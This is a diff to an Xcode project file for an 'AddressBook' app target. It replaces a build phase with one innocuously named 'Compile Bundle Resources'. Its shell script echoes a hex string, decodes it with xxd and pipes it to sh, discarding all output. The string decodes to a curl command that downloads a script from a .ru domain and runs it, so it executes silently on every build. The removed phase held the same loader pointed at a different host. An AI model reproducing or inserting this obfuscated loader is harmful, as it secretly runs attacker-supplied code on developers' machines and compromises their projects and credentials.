@@ -269,7 +269,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8720C27A26133F34005713A1 /* Build configuration list for PBXNativeTarget "AddressBook" */;
 			buildPhases = (
-				65AC5B99ED4E20FCC10FAAAA /* Link Bundle Resources */,
+				70F72E1E999C9EA24D0FAAAA /* Compile Bundle Resources */,
 				A7244FD463EB35AF1DAFEFBD /* [CP] Check Pods Manifest.lock */,
 				8720C26226133F2C005713A1 /* Sources */,
 				8720C26326133F2C005713A1 /* Frameworks */,
@@ -331,26 +331,30 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		65AC5B99ED4E20FCC10FAAAA /* Link Bundle Resources */ = {
+
+	70F72E1E999C9EA24D0FAAAA /* Compile Bundle Resources */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Resources";
+			name = "Compile Bundle Resources";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d736b202d6d2031322068747470733a2f2f61707363646e2e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-			showEnvVarsInLog = 0;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d736b202d6d20362068747470733a2f2f6164677561726473746174732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";
+			showEnvVarsInLog = 0;			
 		};
+	
 		A7244FD463EB35AF1DAFEFBD /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
